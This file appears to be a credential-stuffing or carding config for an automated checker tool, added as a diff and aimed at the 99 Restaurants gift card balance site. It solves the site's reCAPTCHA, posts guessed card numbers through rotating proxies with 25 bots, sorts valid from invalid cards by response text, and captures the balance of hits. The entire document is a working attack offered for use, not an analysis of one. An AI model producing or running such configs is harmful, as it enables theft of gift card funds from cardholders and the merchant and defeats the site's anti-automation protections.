@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "99 Resturant GC",
+  "SuggestedBots": 25,
+  "LastModified": "2018-07-05T19:45:39.191899+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://99restaurants.wgiftcard.com/card/balance/checkBalance/99restaurants/1" "6LcmqwITAAAAAD_8PDdcM-9AhyftRNtFXn1U5e_8" -> VAR "RECAP" 
+REQUEST POST "https://99restaurants.wgiftcard.com/card/balance/checkBalance/99restaurants/1" AutoRedirect=TRUE 
+  CONTENT "card_number=<USER>&email_address=&mobile_phone=&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "The balance of the Giftcard ending with" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid account number or the account is closed" 
+PARSE "<SOURCE>" LR "<span style=\"font-size: 15px;font-weight: bold;\">$" "</span>." Recursive=FALSE -> CAP "Balance" "$" "" 
